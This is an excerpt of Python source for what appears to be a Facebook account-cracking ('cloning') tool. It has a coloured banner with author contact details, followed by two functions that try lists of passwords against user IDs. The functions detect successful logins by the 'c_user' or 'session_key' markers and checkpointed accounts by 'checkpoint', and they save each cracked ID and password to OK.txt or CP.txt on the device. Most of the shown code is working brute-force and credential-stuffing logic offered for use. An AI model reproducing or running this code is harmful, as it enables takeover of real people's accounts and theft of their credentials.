...
\033[38;5;196m───────────────────────────────────────────────────
\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m ADMIN    \033[38;5;196m : \x1b[38;5;46mVixvus
\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m FACEBOOK\033[38;5;196m  :\x1b[38;5;46m VIXVUSS
\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m WHATSAPP \033[38;5;196m : \x1b[38;5;46m12356898
\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m VERSION \033[38;5;196m  :\x1b[38;5;46m 0.0.1
\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m TOOLS \033[38;5;196m    :\x1b[38;5;46m RUN/FILE \x1b[38;5;46mCLONING
...
def ffb(ids,names,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r\r{K} {A}[{E}AXE{A}] [{E}{loop}{B}/{E}{tl}{A}] {E}[OK:-{len(ok)}]');sys.stdout.flush()
        ...
        try:
                ...
                for fikr in pasx:
                        ...
                        if "c_user" in TANIM:
                                ...
                                print('\r\r \033[38;5;46m[AXE-OK] %s | %s'%(ids,pas))
                                open('/sdcard/AXE/OK.txt', 'a').write(ids+'|'+pas+'\n')
                                ok.append(ids)
                                break
                        elif 'checkpoint' in TANIM:
                                print('\r\r\x1b[1;90m [AXE-CP] '+ids+' | '+pas+'\033[1;97m')
                                open('/sdcard/AXE/CP.txt', 'a').write(ids+'|'+pas+'\n')
                                cp.append(ids)
                                break
                        else:
                                continue
...
def api(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r\r{K} {A}[{E}AXE{A}] [{E}{loop}{B}/{E}{tl}{A}] {E}[OK:-{len(ok)}]')
        sys.stdout.flush()
        try:
                for pas in pasx:
                        ...
                        if 'session_key' in po:
                                uid = po['uid']
                                print(f'\r\r {E}[AXE-OK] {str(uid)} | {pas}')
                                open('/sdcard/AXE/OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ok.append(str(uid))
                                break
                        elif twf in str(po):
                                ...
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r {D}[AXE-CP] {str(uid)} | {pas}')
                                open('/sdcard/AXE/CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
